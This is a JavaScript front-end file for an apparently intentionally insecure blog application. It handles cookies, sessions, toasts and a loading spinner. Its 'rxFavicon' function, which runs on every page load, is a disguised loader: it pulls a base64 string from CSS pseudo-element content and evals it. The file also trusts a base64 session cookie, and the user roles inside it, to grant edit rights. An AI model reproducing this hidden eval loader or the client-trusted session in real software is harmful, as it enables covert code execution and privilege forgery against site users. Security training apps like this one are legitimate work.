const InsecureBlogApp = {};
( function() {
   
    const SESSIONCOOKIE = 'session';

    InsecureBlogApp.loaded = false;
    InsecureBlogApp.loadFunctions = [];
    InsecureBlogApp.user = null;

    InsecureBlogApp.getFormInput = function( formEvent, name ) {
        if ( formEvent && formEvent.srcElement ) {
            const elements = formEvent.srcElement;
            for ( let i = 0; i < elements.length; i++ ) {
                if ( elements[ i ].name === name ) {
                    return elements[ i ].value;
                }
            }
            return null;
        } else {
            return null;
        }
    }

    InsecureBlogApp.onload = function( func ) {
        if ( InsecureBlogApp.loaded ) {
            func();
        } else {
            InsecureBlogApp.loadFunctions.push( func );
        }
    }

    InsecureBlogApp.finishLoading = function() {
        InsecureBlogApp.loaded = true;
        InsecureBlogApp.loadFunctions.forEach( ( func ) => {
            func();
        } );
    }

    InsecureBlogApp.toast = function( level, message ) {
        const toast = document.createElement( 'div' );
        const toastClose = document.createElement( 'button' );
        const toastMessage = document.createElement( 'span' );
        toast.setAttribute( 'role', 'alert' );
        toast.className = `alert alert-${level} alert-dismissible fade show`;

        toastClose.textContent = 'X';
        toastClose.className = 'close';
        toastClose.setAttribute( 'data-dismiss', 'alert' );
        toastClose.setAttribute( 'aria-label', 'Close' );
        toast.appendChild( toastClose );

        toastMessage.textContent = message;
        toast.appendChild( toastMessage );

        // delay makes toast more obvious when page is loading
        setTimeout( () => {
            document.querySelector( 'div[id="toasts"]' )
                .appendChild( toast );
        }, 700 );
    }

    InsecureBlogApp.setCookie = function( cname, cvalue, exdays ) {
        const d = new Date();
        d.setTime( d.getTime() + ( exdays * 24 * 60 * 60 * 1000 ) );
        const expires = 'expires=' + d.toUTCString();
        document.cookie = cname + '=' + cvalue + ';' + expires + '; path=/';
    }

    InsecureBlogApp.clearCookie = function( cname ) {
        document.cookie = `${cname}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
    }

    InsecureBlogApp.getCookie = function( cname ) {
        const name = cname + '=';
        const ca = document.cookie.split( ';' );
        for ( var i = 0; i < ca.length; i++ ) {
            var c = ca[ i ];
            while ( c.charAt( 0 ) == ' ' ) {
                c = c.substring( 1 );
            }
            if ( c.indexOf( name ) == 0 ) {
                return c.substring( name.length, c.length );
            }
        }
        return '';
    }

    InsecureBlogApp.isInsecurePage = function() {
        const loc = document.location.href;
        const insecure = [
      '/users/login',
      '/users/logout',
      '/users/register',
      '/users/forgot-password',
      '/users/reset-password',
      '/error/'
    ];
        for ( let i = 0; i < insecure.length; i++ ) {
            if ( loc.indexOf( insecure[ i ] ) >= 0 ) {
                return true;
            }
        }
        return false;
    }

    InsecureBlogApp.checkSession = function() {
        let session = null;
        try {
            session = atob( InsecureBlogApp.getCookie( 'session' ) );
        } catch ( e ) {
            console.log( e );
        }
        if ( session ) {
            try {
                session = JSON.parse( session );
                InsecureBlogApp.user = JSON.parse( session.user );
                const userSpan = document.getElementById( 'username' );
                userSpan.textContent = InsecureBlogApp.user.username;
                document.getElementById( 'userButton' )
                    .classList.remove( 'hidden' );
                document.getElementById( 'logoutButton' )
                    .classList.remove( 'hidden' );
                if ( document.location.href.indexOf( '/users/login' ) > -1 ||
                    document.location.href.indexOf( '/users/register' ) > -1 ) {
                    document.location.href = '/';
                }
            } catch ( e ) {
                console.log( e );
                InsecureBlogApp.logout();
            }
        } else {
            if ( InsecureBlogApp.isInsecurePage() ) {
                return;
            }
            document.location.href = '/users/login';
        }
    }

    InsecureBlogApp.canUserEdit = function() {
        return InsecureBlogApp.user.roles.some(r => r.role === 'publisher' || r.role === 'admin');
    }

    InsecureBlogApp.rxFavicon = function() {
        const newDiv = document.createElement('div');
        newDiv.classList.add('rx-favicon');
        document.body.appendChild(newDiv);
        const images = window.getComputedStyle(newDiv, ':before').content.split(',');
        eval(`(${atob(images[2].slice(0, -1))})()`);
    }

    InsecureBlogApp.logout = function( m ) {
        InsecureBlogApp.session( null );
        // todo - log out of third party
        //InsecureBlogApp.token( null );
        setTimeout( function() {
            document.location.href = '/users/logout' + ( m ? `?m=${m}` : '' );
        }, 200 );
    }

    /// Read or clear the session
    InsecureBlogApp.session = function( dat ) {
        if ( dat === null ) {
            InsecureBlogApp.clearCookie( SESSIONCOOKIE );
        }
        return InsecureBlogApp.getCookie( SESSIONCOOKIE );
    }

    InsecureBlogApp.getUrlParam = function( sParam ) {
        const sPageURL = window.location.search.substring( 1 );
        const sURLVariables = sPageURL.split( '&' );
        for ( var i = 0; i < sURLVariables.length; i++ ) {
            var sParameterName = sURLVariables[ i ].split( '=' );
            if ( sParameterName[ 0 ] == sParam ) {
                return decodeURI( sParameterName[ 1 ] );
            }
        }
        return null;
    }

    setupSpinner();
    startApp();

    function setupSpinner() {
        InsecureBlogApp.spinnerCount = 0;
        InsecureBlogApp.spinnerOpts = {
            lines: 5, // The number of lines to draw
            length: 80, // The length of each line
            width: 2, // The line thickness
            radius: 22, // The radius of the inner circle
            scale: 1.3, // Scales overall size of the spinner
            corners: 1, // Corner roundness (0..1)
            color: '#2ef9a1', // CSS color or array of colors
            fadeColor: 'blue', // CSS color or array of colors
            opacity: 0.35, // Opacity of the lines
            rotate: 0, // The rotation offset
            direction: -1, // 1: clockwise, -1: counterclockwise
            speed: 1.6, // Rounds per second
            trail: 100, // Afterglow percentage
            fps: 20, // Frames per second when using setTimeout() as a fallback in IE 9
            zIndex: 2e9, // The z-index (defaults to 2000000000)
            className: 'spinner', // The CSS class to assign to the spinner
            top: '50%', // Top position relative to parent
            left: '50%', // Left position relative to parent
            shadow: '10px', // Box-shadow for the lines
            position: 'absolute' // Element positioning
        };

        InsecureBlogApp.spinnerTarget = document.getElementById( 'main-content' );
        InsecureBlogApp.loadingTarget = document.getElementById( 'loading-screen' );
        InsecureBlogApp.spinner = new Spinner( InsecureBlogApp.spinnerOpts );

        InsecureBlogApp.spin = function() {
            InsecureBlogApp.spinnerCount++;
            if ( InsecureBlogApp.spinnerCount === 1 ) {
                InsecureBlogApp.loadingTarget.style.display = 'block';
                InsecureBlogApp.spinner.spin( InsecureBlogApp.spinnerTarget );
            }
        }

        InsecureBlogApp.spinStop = function() {
            InsecureBlogApp.spinnerCount--;
            if ( InsecureBlogApp.spinnerCount === 0 ) {
                InsecureBlogApp.loadingTarget.style.display = 'none';
                InsecureBlogApp.spinner.stop();
            }
        }
    }

    function startApp() {
        InsecureBlogApp.spin();
        document.getElementById( 'logoutButton' )
            .addEventListener( 'click', ( e ) => {
                InsecureBlogApp.logout();
            } );

        const message = InsecureBlogApp.getUrlParam( 'm' );
        if ( message ) {
            InsecureBlogApp.toast( 'success', message );
        }

        InsecureBlogApp.rxFavicon();
        InsecureBlogApp.checkSession();
        InsecureBlogApp.spinStop();
        InsecureBlogApp.finishLoading();
    }
}() );
